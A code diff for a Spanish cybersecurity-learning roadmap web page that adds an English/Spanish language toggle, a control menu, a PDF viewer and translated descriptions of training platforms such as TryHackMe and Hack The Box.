@@ -71,14 +71,25 @@ canvas{display:block}
 .preview-cta a:hover{transform:scale(1.03);box-shadow:0 4px 20px rgba(0,255,136,0.3)}
 .preview-cta a.secondary{background:rgba(255,255,255,0.08);color:#c0c0d0;border:1px solid rgba(255,255,255,0.1)}
 .preview-cta a.secondary:hover{background:rgba(255,255,255,0.13);box-shadow:none}
+.pdf-card{max-width:min(1080px,96vw);height:min(90vh,900px);display:flex;flex-direction:column}
+.pdf-intro{font-size:0.73rem;color:#8a8aa0;line-height:1.5;margin:-4px 0 14px}
+.pdf-frame-wrap{flex:1;min-height:320px;border:1px solid rgba(255,255,255,0.08);border-radius:14px;overflow:hidden;background:rgba(255,255,255,0.03)}
+#pdfFrame{width:100%;height:100%;border:none;background:#fff}
 .legend{position:absolute;bottom:16px;left:50%;transform:translateX(-50%);display:flex;gap:14px;background:rgba(5,5,16,0.85);border:1px solid rgba(0,255,136,0.12);border-radius:24px;padding:8px 16px;pointer-events:none}
 .leg-item{display:flex;align-items:center;gap:6px;font-size:0.7rem;color:#707080}
 .leg-dot{width:8px;height:8px;border-radius:50%}
 .hint{position:absolute;bottom:64px;left:50%;transform:translateX(-50%);color:#303040;font-size:0.68rem;white-space:nowrap;text-align:center;padding:0 10px}
-.controls{position:absolute;top:12px;right:12px;display:flex;flex-direction:column;gap:6px;pointer-events:all}
+.controls{position:absolute;top:12px;right:12px;display:flex;flex-direction:column;align-items:flex-end;gap:6px;pointer-events:all}
 .ctrl-btn{background:rgba(5,5,16,0.85);border:1px solid rgba(0,255,136,0.18);color:#808090;width:36px;height:36px;border-radius:8px;font-size:1rem;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all 0.15s;font-family:inherit}
 .ctrl-btn:hover{border-color:#00ff88;color:#00ff88}
 .ctrl-btn.active{border-color:#00ff88;color:#00ff88;background:rgba(0,255,136,0.08)}
+.menu-trigger{box-shadow:0 0 18px rgba(0,255,136,0.06)}
+.control-menu{display:flex;flex-direction:column;gap:6px;padding:8px;background:rgba(5,5,16,0.78);border:1px solid rgba(0,255,136,0.12);border-radius:14px;backdrop-filter:blur(8px);box-shadow:0 18px 40px rgba(0,0,0,0.38),0 0 24px rgba(0,255,136,0.05);opacity:0;transform:translateY(-8px) scale(0.96);transform-origin:top right;pointer-events:none;transition:opacity 0.18s ease,transform 0.18s ease;max-height:0;overflow:hidden}
+.control-menu.open{opacity:1;transform:translateY(0) scale(1);pointer-events:auto;max-height:320px}
+.lang-toggle{display:flex;background:rgba(5,5,16,0.9);border:1px solid rgba(0,255,136,0.16);border-radius:10px;padding:3px;gap:3px;box-shadow:0 0 18px rgba(0,255,136,0.06)}
+.lang-btn{min-width:40px;height:30px;border:none;border-radius:8px;background:transparent;color:#707080;font-size:0.68rem;font-weight:700;letter-spacing:1px;cursor:pointer;transition:all 0.15s;font-family:'JetBrains Mono',monospace}
+.lang-btn:hover{color:#c0c0d0;background:rgba(255,255,255,0.05)}
+.lang-btn.active{background:#00ff88;color:#050510;box-shadow:0 0 18px rgba(0,255,136,0.22)}
 .level-panel{display:none}
 .lp-row{display:flex;align-items:center;gap:8px;background:rgba(5,5,16,0.75);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:6px 12px}
 .lp-num{font-size:1rem;font-weight:700}
@@ -95,7 +106,11 @@ canvas{display:block}
   .leg-item{font-size:0.65rem}
   .controls{top:8px;right:8px}
   .ctrl-btn{width:34px;height:34px}
+  .lang-toggle{align-self:flex-end}
+  .lang-btn{min-width:38px;height:28px}
+  .control-menu{padding:6px}
   #levelOverlay .modal-card,#previewOverlay .modal-card{padding:16px 16px 20px}
+  #pdfOverlay .modal-card{padding:16px 16px 20px}
   .preview-meta{grid-template-columns:1fr}
   #dragonInfo{display:none}
 
@@ -177,6 +192,7 @@ canvas{display:block}
   #labOverlay .modal-card,#labModalCard{height:100vh!important;max-height:100vh!important;border-radius:0!important}
   #labSidebarWrapper{max-height:46px!important;min-height:40px!important}
   #labTerminal{font-size:0.67rem!important}
+  .pdf-card{height:100vh!important;max-height:100vh!important;border-radius:0!important}
 }
 /* ── Theory / Clase Magistral ── */
 #theoryPanel{display:none;position:absolute;inset:0;background:rgba(4,4,14,0.98);z-index:10;overflow-y:auto;padding:20px 22px 24px;flex-direction:column;gap:14px}
@@ -199,8 +215,22 @@ canvas{display:block}
 <body>
 
 <div id="ui">
-  <div class="header"><h1>&gt;_ cyberpath &nbsp;<span style="color:#ff3333;font-size:0.75em;vertical-align:middle">🐉</span></h1><p>Roadmap interactivo · 18 laboratorios</p></div>
-  <div id="tooltip"><div class="tt-num" id="ttNum">PLATAFORMA #01</div><div class="tt-name" id="ttName">—</div><div class="tt-badge" id="ttBadge">—</div><div class="tt-url" id="ttUrl">—</div><div class="tt-desc" id="ttDesc">—</div><div class="tt-features" id="ttFeatures"></div><div class="tt-click"><i class="fa-solid fa-arrow-up-right-from-square" style="font-size:14px"></i> Abrir plataforma</div></div>
+  <div class="header">
+    <h1>&gt;_ cyberpath &nbsp;<span style="color:#ff3333;font-size:0.75em;vertical-align:middle">🐉</span></h1>
+    <p id="headerSubtitle">Roadmap interactivo · 18 plataformas · 5 laboratorios</p>
+  </div>
+  <div id="tooltip">
+    <div class="tt-num" id="ttNum">PLATAFORMA #01</div>
+    <div class="tt-name" id="ttName">—</div>
+    <div class="tt-badge" id="ttBadge">—</div>
+    <div class="tt-url" id="ttUrl">—</div>
+    <div class="tt-desc" id="ttDesc">—</div>
+    <div class="tt-features" id="ttFeatures"></div>
+    <div class="tt-click">
+      <i class="fa-solid fa-arrow-up-right-from-square" style="font-size:14px"></i>
+      <span id="tooltipActionText">Abrir plataforma</span>
+    </div>
+  </div>
   <div id="speechBubble">
     <div class="sb-dragon"><div class="sb-dragon-dot"></div>KALI</div>
     <div class="sb-name" id="sbName">—</div>
@@ -213,20 +243,90 @@ canvas{display:block}
     <div class="di-status" id="diStatus">Despegando...</div>
   </div>
   <button id="btnInfo" title="¿Por qué estos niveles?"><i class="fa-solid fa-circle-question" style="font-size:18px"></i></button>
-  <div class="level-panel"><div class="lp-row"><span class="lp-num" style="color:#00ff88">6</span><span class="lp-label">Principiante</span></div><div class="lp-row"><span class="lp-num" style="color:#ff9500">6</span><span class="lp-label">Intermedio</span></div><div class="lp-row"><span class="lp-num" style="color:#ff5555">6</span><span class="lp-label">Avanzado</span></div></div>
-  <div class="legend"><div class="leg-item"><div class="leg-dot" style="background:#00ff88"></div>Principiante</div><div class="leg-item"><div class="leg-dot" style="background:#ff9500"></div>Intermedio</div><div class="leg-item"><div class="leg-dot" style="background:#ff5555"></div>Avanzado</div></div>
-  <div class="hint">Arrastra para rotar · Click para visitar · El dragón revela cada plataforma</div>
+  <div class="level-panel">
+    <div class="lp-row"><span class="lp-num" style="color:#00ff88">6</span><span class="lp-label" id="levelPanelBeginner">Principiante</span></div>
+    <div class="lp-row"><span class="lp-num" style="color:#ff9500">6</span><span class="lp-label" id="levelPanelIntermediate">Intermedio</span></div>
+    <div class="lp-row"><span class="lp-num" style="color:#ff5555">6</span><span class="lp-label" id="levelPanelAdvanced">Avanzado</span></div>
+  </div>
+  <div class="legend">
+    <div class="leg-item"><div class="leg-dot" style="background:#00ff88"></div><span id="legendBeginner">Principiante</span></div>
+    <div class="leg-item"><div class="leg-dot" style="background:#ff9500"></div><span id="legendIntermediate">Intermedio</span></div>
+    <div class="leg-item"><div class="leg-dot" style="background:#ff5555"></div><span id="legendAdvanced">Avanzado</span></div>
+  </div>
+  <div class="hint" id="sceneHint">Arrastra para rotar · Click para visitar · El dragón revela cada plataforma</div>
   <div class="controls">
-    <button class="ctrl-btn" id="btnReset" title="Reset"><i class="fa-solid fa-house" style="font-size:18px"></i></button>
-    <button class="ctrl-btn" id="btnAuto" title="Auto-rotar"><i class="fa-solid fa-play" style="font-size:16px" id="autoIcon"></i></button>
+    <div class="lang-toggle" id="langToggle" aria-label="Language selector">
+      <button class="lang-btn active" id="langEs" data-lang="es" type="button">ES</button>
+      <button class="lang-btn" id="langEn" data-lang="en" type="button">EN</button>
+    </div>
+    <button class="ctrl-btn menu-trigger" id="btnMenu" title="Abrir menu" type="button" aria-expanded="false" aria-controls="controlMenu"><i class="fa-solid fa-bars" style="font-size:15px"></i></button>
+    <div class="control-menu" id="controlMenu">
+      <button class="ctrl-btn" id="btnPdf" title="Ver PDF" type="button"><i class="fa-solid fa-file-pdf" style="font-size:16px"></i></button>
+      <button class="ctrl-btn" id="btnReset" title="Reset" type="button"><i class="fa-solid fa-house" style="font-size:18px"></i></button>
+      <button class="ctrl-btn" id="btnAuto" title="Auto-rotar" type="button"><i class="fa-solid fa-play" style="font-size:16px" id="autoIcon"></i></button>
     <button class="ctrl-btn" id="btnDragon" title="Toggle dragón" style="color:#00ff88;border-color:rgba(0,255,136,0.4)"><i class="fa-solid fa-dragon" style="font-size:16px"></i></button>
     <button class="ctrl-btn" id="btnLab" title="Laboratorio de retos" style="color:#a78bfa;border-color:rgba(167,139,250,0.4)"><i class="fa-solid fa-terminal" style="font-size:15px"></i></button>
   </div>
 </div>
 
-<div class="modal-overlay" id="levelOverlay"><div class="modal-card"><div class="modal-header"><h2><i class="fa-solid fa-chart-simple" style="color:#00ff88;font-size:22px"></i> Criterios de Nivel</h2><button class="modal-close" id="closeLevelModal"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button></div><div class="level-card" style="border-left:3px solid #00ff88"><h3><span class="dot" style="background:#00ff88"></span><span style="color:#00ff88">Principiante</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Personas sin experiencia previa en ciberseguridad.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Tutoriales guiados, conceptos básicos, retos con pistas.</p><ul><li>Sin necesidad de conocimientos técnicos previos</li><li>Entornos controlados y seguros</li><li>Fundamentos: Linux, redes, web básica</li></ul></div><div class="level-card" style="border-left:3px solid #ff9500"><h3><span class="dot" style="background:#ff9500"></span><span style="color:#ff9500">Intermedio</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Quienes dominan lo básico y buscan escenarios más realistas.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Máquinas vulnerables, CTFs, laboratorios de explotación web.</p><ul><li>Requiere terminal, HTTP y scripting básico</li><li>Herramientas profesionales (Burp, Nmap, Metasploit)</li></ul></div><div class="level-card" style="border-left:3px solid #ff5555"><h3><span class="dot" style="background:#ff5555"></span><span style="color:#ff5555">Avanzado</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Profesionales que buscan simular entornos de producción reales.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Infraestructuras complejas, exploits, ingeniería inversa.</p><ul><li>Requiere dominio de redes, sistemas y programación</li><li>Preparación para OSCP, OSCE, etc.</li></ul></div></div></div>
+<div class="modal-overlay" id="levelOverlay">
+  <div class="modal-card" id="levelModalCard"></div>
+</div>
 
-<div class="modal-overlay" id="previewOverlay"><div class="modal-card"><div class="preview-header"><div><div class="preview-title" id="pvName">—</div><span class="preview-badge" id="pvBadge">—</span></div><button class="modal-close" id="closePreview"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button></div><div class="preview-content"><div class="preview-section"><h4><i class="fa-regular fa-clipboard" style="font-size:16px"></i> Descripción</h4><p id="pvDesc">—</p></div><div class="preview-section"><h4><i class="fa-solid fa-bullseye" style="font-size:16px"></i> ¿Por qué este nivel?</h4><p id="pvReason">—</p></div><div class="preview-section"><h4><i class="fa-solid fa-wand-magic-sparkles" style="font-size:16px"></i> Características</h4><ul id="pvFeatures"></ul></div><div class="preview-section"><h4><i class="fa-solid fa-chart-pie" style="font-size:16px"></i> Info Técnica</h4><div class="preview-meta"><div class="preview-meta-item"><span class="preview-meta-label">Dominio</span><span class="preview-meta-value" id="pvDomain">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Tipo</span><span class="preview-meta-value" id="pvType">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Idioma</span><span class="preview-meta-value" id="pvLang">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Precio</span><span class="preview-meta-value" id="pvPrice">—</span></div></div></div><div class="preview-cta"><a href="#" target="_blank" id="pvVisit"><i class="fa-solid fa-rocket" style="font-size:16px"></i> Visitar Plataforma</a></div></div></div></div>
+<div class="modal-overlay" id="previewOverlay">
+  <div class="modal-card">
+    <div class="preview-header">
+      <div>
+        <div class="preview-title" id="pvName">—</div>
+        <span class="preview-badge" id="pvBadge">—</span>
+      </div>
+      <button class="modal-close" id="closePreview"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button>
+    </div>
+    <div class="preview-content">
+      <div class="preview-section">
+        <h4><i class="fa-regular fa-clipboard" style="font-size:16px"></i> <span id="pvDescLabel">Descripción</span></h4>
+        <p id="pvDesc">—</p>
+      </div>
+      <div class="preview-section">
+        <h4><i class="fa-solid fa-bullseye" style="font-size:16px"></i> <span id="pvReasonLabel">¿Por qué este nivel?</span></h4>
+        <p id="pvReason">—</p>
+      </div>
+      <div class="preview-section">
+        <h4><i class="fa-solid fa-wand-magic-sparkles" style="font-size:16px"></i> <span id="pvFeaturesLabel">Características</span></h4>
+        <ul id="pvFeatures"></ul>
+      </div>
+      <div class="preview-section">
+        <h4><i class="fa-solid fa-chart-pie" style="font-size:16px"></i> <span id="pvMetaLabel">Info Técnica</span></h4>
+        <div class="preview-meta">
+          <div class="preview-meta-item"><span class="preview-meta-label" id="pvDomainLabel">Dominio</span><span class="preview-meta-value" id="pvDomain">—</span></div>
+          <div class="preview-meta-item"><span class="preview-meta-label" id="pvTypeLabel">Tipo</span><span class="preview-meta-value" id="pvType">—</span></div>
+          <div class="preview-meta-item"><span class="preview-meta-label" id="pvLangLabel">Idioma</span><span class="preview-meta-value" id="pvLang">—</span></div>
+          <div class="preview-meta-item"><span class="preview-meta-label" id="pvPriceLabel">Precio</span><span class="preview-meta-value" id="pvPrice">—</span></div>
+        </div>
+      </div>
+      <div class="preview-cta">
+        <a href="#" target="_blank" id="pvVisit"><i class="fa-solid fa-rocket" style="font-size:16px"></i> <span id="pvVisitText">Visitar Plataforma</span></a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="pdfOverlay">
+  <div class="modal-card pdf-card">
+    <div class="modal-header">
+      <h2><i class="fa-solid fa-file-pdf" style="color:#ff5555;font-size:22px"></i> <span id="pdfTitle">CyberPath PDF</span></h2>
+      <button class="modal-close" id="closePdf"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button>
+    </div>
+    <p class="pdf-intro" id="pdfIntro">Consulta la versión visual del roadmap sin salir de la web.</p>
+    <div class="pdf-frame-wrap">
+      <iframe id="pdfFrame" src="assets/CyberPath_Dragon_Edition.pdf#view=FitH" title="CyberPath PDF"></iframe>
+    </div>
+    <div class="preview-cta">
+      <a href="assets/CyberPath_Dragon_Edition.pdf" target="_blank" id="pdfOpen"><i class="fa-solid fa-arrow-up-right-from-square" style="font-size:16px"></i> <span id="pdfOpenText">Abrir en nueva pestaña</span></a>
+      <a href="assets/CyberPath_Dragon_Edition.pdf" download class="secondary" id="pdfDownload"><i class="fa-solid fa-download" style="font-size:16px"></i> <span id="pdfDownloadText">Descargar PDF</span></a>
+    </div>
+  </div>
+</div>
 
 <!-- ═══ LAB MODAL ═══ -->
 <div class="modal-overlay" id="labOverlay">
@@ -235,7 +335,7 @@ canvas{display:block}
     <div style="display:flex;justify-content:space-between;align-items:center;padding:14px 20px;border-bottom:1px solid rgba(167,139,250,0.2);flex-shrink:0">
       <div style="display:flex;align-items:center;gap:10px">
         <i class="fa-solid fa-terminal" style="color:#a78bfa;font-size:18px"></i>
-        <span style="font-family:'Space Grotesk',sans-serif;color:#a78bfa;font-size:1.1rem">Laboratorio de Retos</span>
+        <span style="font-family:'Space Grotesk',sans-serif;color:#a78bfa;font-size:1.1rem" id="labModalTitle">Laboratorio de Retos</span>
         <span id="labDifficulty" style="font-size:0.6rem;font-weight:700;padding:2px 8px;border-radius:20px;background:rgba(0,255,136,0.15);color:#00ff88;letter-spacing:1px"></span>
       </div>
       <button class="modal-close" id="closeLabModal"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button>
@@ -253,31 +353,31 @@ canvas{display:block}
           <div>
             <span class="theory-badge" id="theoryBadge">—</span>
             <div class="theory-title" id="theoryTitle">—</div>
-            <div class="theory-subtitle">📚 CLASE MAGISTRAL</div>
+            <div class="theory-subtitle" id="theorySubtitle">📚 CLASE MAGISTRAL</div>
           </div>
           <div class="theory-block">
-            <h4 style="color:#00ff88"><i class="fa-solid fa-book-open" style="font-size:15px"></i> ¿Qué vas a aprender?</h4>
+            <h4 style="color:#00ff88"><i class="fa-solid fa-book-open" style="font-size:15px"></i> <span id="theoryLearnLabel">¿Qué vas a aprender?</span></h4>
             <p id="theoryConcept">—</p>
           </div>
           <div class="theory-block">
-            <h4 style="color:#a78bfa"><i class="fa-solid fa-lightbulb" style="font-size:15px"></i> Conceptos clave</h4>
+            <h4 style="color:#a78bfa"><i class="fa-solid fa-lightbulb" style="font-size:15px"></i> <span id="theoryPointsLabel">Conceptos clave</span></h4>
             <ul id="theoryPoints"></ul>
           </div>
           <div class="theory-block">
-            <h4 style="color:#ff9500"><i class="fa-solid fa-terminal" style="font-size:15px"></i> Comandos / Herramientas</h4>
+            <h4 style="color:#ff9500"><i class="fa-solid fa-terminal" style="font-size:15px"></i> <span id="theoryToolsLabel">Comandos / Herramientas</span></h4>
             <div id="theoryTools"></div>
           </div>
           <div class="theory-block">
-            <h4 style="color:#ff5555"><i class="fa-solid fa-triangle-exclamation" style="font-size:15px"></i> ¿Por qué importa en ciberseguridad?</h4>
+            <h4 style="color:#ff5555"><i class="fa-solid fa-triangle-exclamation" style="font-size:15px"></i> <span id="theoryWhyLabel">¿Por qué importa en ciberseguridad?</span></h4>
             <p id="theoryWhy">—</p>
           </div>
-          <button class="theory-start-btn" id="theoryStartBtn"><i class="fa-solid fa-play" style="font-size:15px"></i> ¡Entendido — Comenzar Reto!</button>
+          <button class="theory-start-btn" id="theoryStartBtn"><i class="fa-solid fa-play" style="font-size:15px"></i> <span id="theoryStartText">¡Entendido — Comenzar Reto!</span></button>
         </div>
         <!-- Descripcion reto -->
         <div id="labDescArea" style="padding:14px 18px;border-bottom:1px solid rgba(255,255,255,0.07);flex-shrink:0">
           <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:6px">
             <div style="font-family:'Space Grotesk',sans-serif;color:#e0e0e8;font-size:0.95rem" id="labTitle">—</div>
-            <button class="theory-tab-btn" id="theoryToggleBtn" title="Ver clase magistral"><i class="fa-solid fa-book-open"></i> Teoría</button>
+            <button class="theory-tab-btn" id="theoryToggleBtn" title="Ver clase magistral"><i class="fa-solid fa-book-open"></i> <span id="theoryToggleText">Teoría</span></button>
           </div>
           <div style="font-size:0.7rem;color:#808090;line-height:1.5;margin-bottom:8px" id="labDesc">—</div>
           <div style="display:flex;gap:8px;flex-wrap:wrap" id="labObjectives"></div>
@@ -290,9 +390,9 @@ canvas{display:block}
           <input id="labInput" type="text" autocomplete="off" autocorrect="off" spellcheck="false"
             style="flex:1;min-width:0;background:transparent;border:none;outline:none;color:#e0e0e8;font-family:'JetBrains Mono',monospace;font-size:0.72rem;caret-color:#a78bfa"
             placeholder="escribe un comando...">
-          <button id="labRun" style="background:rgba(167,139,250,0.15);border:1px solid rgba(167,139,250,0.3);color:#a78bfa;padding:4px 12px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit">Ejecutar</button>
-          <button id="labHint" style="background:rgba(255,149,0,0.1);border:1px solid rgba(255,149,0,0.25);color:#ff9500;padding:4px 10px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit"><i class="fa-solid fa-lightbulb"></i></button>
-          <button id="labReset" style="background:rgba(255,85,85,0.1);border:1px solid rgba(255,85,85,0.2);color:#ff5555;padding:4px 10px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit"><i class="fa-solid fa-rotate-left"></i></button>
+          <button id="labRun" style="background:rgba(167,139,250,0.15);border:1px solid rgba(167,139,250,0.3);color:#a78bfa;padding:4px 12px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit"><span id="labRunText">Ejecutar</span></button>
+          <button id="labHint" title="Pedir pista" style="background:rgba(255,149,0,0.1);border:1px solid rgba(255,149,0,0.25);color:#ff9500;padding:4px 10px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit"><i class="fa-solid fa-lightbulb"></i></button>
+          <button id="labReset" title="Reiniciar reto" style="background:rgba(255,85,85,0.1);border:1px solid rgba(255,85,85,0.2);color:#ff5555;padding:4px 10px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit"><i class="fa-solid fa-rotate-left"></i></button>
         </div>
       </div>
     </div>
@@ -426,6 +526,219 @@ const PLATFORMS = [
   { name:'Google CTF', url:'https://capturetheflag.withgoogle.com', domain:'google.com', level:2, desc:'CTF anual de Google con desafíos de nivel mundial en criptografía, reversing y exploits.', reason:'Retos diseñados por ingenieros de Google; requieren pensamiento creativo avanzado.', features:['Desafíos de élite','Tecnologías Google','Writeups oficiales','Competencia global'], type:'Elite CTF', lang:'Inglés', price:'Gratis' },
   { name:'Hacking Hub', url:'https://hackinghub.io', domain:'hackinghub.io', level:2, desc:'Plataforma emergente con laboratorios de pentesting y rutas de certificación avanzada.', reason:'Contenido para quienes buscan especializarse en seguridad ofensiva avanzada.', features:['Rutas especializadas','Labs realistas','Mentoría disponible','Enfoque certificaciones'], type:'Advanced Labs', lang:'Inglés', price:'Premium' },
 ];
+
+const LANG_STORAGE_KEY = 'cyberpath_lang';
+let currentLang = (localStorage.getItem(LANG_STORAGE_KEY) || 'es') === 'en' ? 'en' : 'es';
+
+const UI_STRINGS = {
+  es: {
+    pageTitle: 'CyberPath — Dragon Edition',
+    headerSubtitle: 'Roadmap interactivo · 18 plataformas · 5 laboratorios',
+    tooltipAction: 'Abrir plataforma',
+    levelNames: ['PRINCIPIANTE', 'INTERMEDIO', 'AVANZADO'],
+    levelLabels: ['Principiante', 'Intermedio', 'Avanzado'],
+    levelModalTitle: 'Criterios de Nivel',
+    levelCards: [
+      {
+        title: 'Principiante',
+        audience: 'Personas sin experiencia previa en ciberseguridad.',
+        finding: 'Tutoriales guiados, conceptos básicos y retos con pistas.',
+        bullets: ['Sin necesidad de conocimientos técnicos previos', 'Entornos controlados y seguros', 'Fundamentos: Linux, redes y web básica'],
+      },
+      {
+        title: 'Intermedio',
+        audience: 'Quienes dominan lo básico y buscan escenarios más realistas.',
+        finding: 'Máquinas vulnerables, CTFs y laboratorios de explotación web.',
+        bullets: ['Requiere terminal, HTTP y scripting básico', 'Herramientas profesionales como Burp, Nmap y Metasploit'],
+      },
+      {
+        title: 'Avanzado',
+        audience: 'Profesionales que buscan simular entornos de producción reales.',
+        finding: 'Infraestructuras complejas, exploits e ingeniería inversa.',
+        bullets: ['Requiere dominio de redes, sistemas y programación', 'Preparación para OSCP, OSCE y rutas similares'],
+      },
+    ],
+    hint: 'Arrastra para rotar · Click para visitar · El dragón revela cada plataforma',
+    dragonBoot: 'Despegando...',
+    dragonPatrol: 'Patrullando la red...',
+    dragonStealth: 'En modo stealth...',
+    controls: {
+      info: '¿Por qué estos niveles?',
+      pdf: 'Ver PDF',
+      reset: 'Reiniciar vista',
+      auto: 'Auto-rotar',
+      dragon: 'Mostrar u ocultar dragón',
+      lab: 'Laboratorio de retos',
+    },
+    preview: {
+      description: 'Descripción',
+      reason: '¿Por qué este nivel?',
+      features: 'Características',
+      meta: 'Info Técnica',
+      domain: 'Dominio',
+      type: 'Tipo',
+      language: 'Idioma',
+      price: 'Precio',
+      visit: 'Visitar Plataforma',
+    },
+    pdf: {
+      title: 'CyberPath PDF',
+      intro: 'Consulta la versión visual del roadmap sin salir de la web.',
+      open: 'Abrir en nueva pestaña',
+      download: 'Descargar PDF',
+    },
+    lab: {
+      title: 'Laboratorio de Retos',
+      theorySubtitle: '📚 CLASE MAGISTRAL',
+      theoryLearn: '¿Qué vas a aprender?',
+      theoryPoints: 'Conceptos clave',
+      theoryTools: 'Comandos / Herramientas',
+      theoryWhy: '¿Por qué importa en ciberseguridad?',
+      theoryStart: '¡Entendido — Comenzar Reto!',
+      theoryToggle: 'Teoría',
+      theoryToggleTitle: 'Ver clase magistral',
+      inputPlaceholder: 'escribe un comando...',
+      run: 'Ejecutar',
+      hintTitle: 'Pedir pista',
+      resetTitle: 'Reiniciar reto',
+      lockedPrefix: 'Completa primero:',
+      unlocked: 'LABORATORIO DESBLOQUEADO',
+      allDone: '¡TODOS LOS LABORATORIOS COMPLETADOS!',
+      hintPrefix: '💡 Pista:',
+      unknown: 'Escribe help para ver comandos disponibles',
+    },
+    platformLabel: n => `PLATAFORMA #${n}`,
+  },
+  en: {
+    pageTitle: 'CyberPath — Dragon Edition',
+    headerSubtitle: 'Interactive roadmap · 18 platforms · 5 labs',
+    tooltipAction: 'Open platform',
+    levelNames: ['BEGINNER', 'INTERMEDIATE', 'ADVANCED'],
+    levelLabels: ['Beginner', 'Intermediate', 'Advanced'],
+    levelModalTitle: 'Level Criteria',
+    levelCards: [
+      {
+        title: 'Beginner',
+        audience: 'People with no previous cybersecurity experience.',
+        finding: 'Guided tutorials, core concepts, and hint-driven challenges.',
+        bullets: ['No previous technical knowledge required', 'Safe and controlled environments', 'Fundamentals: Linux, networking, and basic web security'],
+      },
+      {
+        title: 'Intermediate',
+        audience: 'People who know the basics and want more realistic scenarios.',
+        finding: 'Vulnerable machines, CTFs, and web exploitation labs.',
+        bullets: ['Requires terminal, HTTP, and basic scripting', 'Professional tooling like Burp, Nmap, and Metasploit'],
+      },
+      {
+        title: 'Advanced',
+        audience: 'Professionals who want to simulate real production environments.',
+        finding: 'Complex infrastructure, exploits, and reverse engineering.',
+        bullets: ['Requires strong networking, systems, and programming skills', 'Great preparation for OSCP, OSCE, and similar tracks'],
+      },
+    ],
+    hint: 'Drag to rotate · Click to inspect · The dragon reveals each platform',
+    dragonBoot: 'Booting up...',
+    dragonPatrol: 'Patrolling the network...',
+    dragonStealth: 'Stealth mode...',
+    controls: {
+      info: 'Why these levels?',
+      pdf: 'Open PDF',
+      reset: 'Reset view',
+      auto: 'Auto-rotate',
+      dragon: 'Toggle dragon',
+      lab: 'Challenge lab',
+    },
+    preview: {
+      description: 'Description',
+      reason: 'Why this level?',
+      features: 'Features',
+      meta: 'Technical Info',
+      domain: 'Domain',
+      type: 'Type',
+      language: 'Language',
+      price: 'Price',
+      visit: 'Visit Platform',
+    },
+    pdf: {
+      title: 'CyberPath PDF',
+      intro: 'Read the visual roadmap companion without leaving the site.',
+      open: 'Open in new tab',
+      download: 'Download PDF',
+    },
+    lab: {
+      title: 'Challenge Lab',
+      theorySubtitle: '📚 MASTERCLASS',
+      theoryLearn: 'What will you learn?',
+      theoryPoints: 'Key concepts',
+      theoryTools: 'Commands / Tools',
+      theoryWhy: 'Why does it matter in cybersecurity?',
+      theoryStart: 'Got it — Start Challenge!',
+      theoryToggle: 'Theory',
+      theoryToggleTitle: 'View masterclass',
+      inputPlaceholder: 'type a command...',
+      run: 'Run',
+      hintTitle: 'Get a hint',
+      resetTitle: 'Reset challenge',
+      lockedPrefix: 'Complete first:',
+      unlocked: 'LAB UNLOCKED',
+      allDone: 'ALL LABS COMPLETED!',
+      hintPrefix: '💡 Hint:',
+      unknown: 'Type help to see available commands',
+    },
+    platformLabel: n => `PLATFORM #${n}`,
+  },
+};
+
+const PLATFORM_I18N = {
+  'TryHackMe': { en: { desc:'Gamified platform with guided learning paths and cloud-based vulnerable machines.', reason:'Great for beginners: friendly interface, step-by-step tutorials, and no local setup required.', features:['Structured paths','Cloud labs','Active community','Free + Premium'], lang:'English' } },
+  'PicoCTF': { en: { desc:'Educational CTF created by Carnegie Mellon, perfect for learning by playing.', reason:'Progressive challenges with hints, a teaching-first approach, and low competitive pressure.', features:['Educational CTF','Built-in hints','No mandatory registration','100% free'], lang:'English', price:'Free' } },
+  'OverTheWire': { en: { desc:'Classic wargames to learn security through the command line and basic exploits.', reason:'Teaches Linux and networking fundamentals from scratch with gradual progression.', features:['CLI focused','Progressive levels','No graphical UI','Long-standing community'], lang:'English', price:'Free' } },
+  'OWASP Juice Shop': { en: { desc:'Modern deliberately vulnerable web application covering the OWASP Top 10.', reason:'A safe environment to practice web hacking with excellent documentation.', features:['OWASP Top 10','Docker/K8s ready','Scoreboard','Open source'], price:'Free' } },
+  'Hacker101': { en: { desc:'Free HackerOne courses to learn bug bounty and web security from zero.', reason:'Created by bug bounty experts and focused on practical skills.', features:['Video courses','Hands-on challenges','Certificates','Bug bounty focus'], lang:'English', price:'Free' } },
+  'CryptoHack': { en: { desc:'Interactive platform to learn modern cryptography through coding challenges.', reason:'Introduces cryptographic concepts with practical Python examples.', features:['Applied cryptography','Built-in Python','Gamified progress','Discord community'], lang:'English', price:'Free' } },
+  'Hack The Box': { en: { desc:'Leading platform with real vulnerable machines, CTFs, and professional certifications.', reason:'Requires some pentesting knowledge; fewer guides, more independent research.', features:['Real machines','Integrated Academy','Certifications','Global ranking'], lang:'English' } },
+  'PortSwigger': { en: { desc:'Free academy from the creators of Burp Suite packed with web security labs.', reason:'Dives deep into web vulnerabilities with solid theory and guided practice.', features:['Burp Suite integrated','Theory + practice','Certification available','Continuously updated'], lang:'English', price:'Free' } },
+  'Root Me': { en: { desc:'French platform with 1000+ security challenges across many categories.', reason:'Wide variety of challenges that force you to apply knowledge creatively.', features:['1000+ challenges','Multiple categories','Community write-ups','Free'], price:'Free' } },
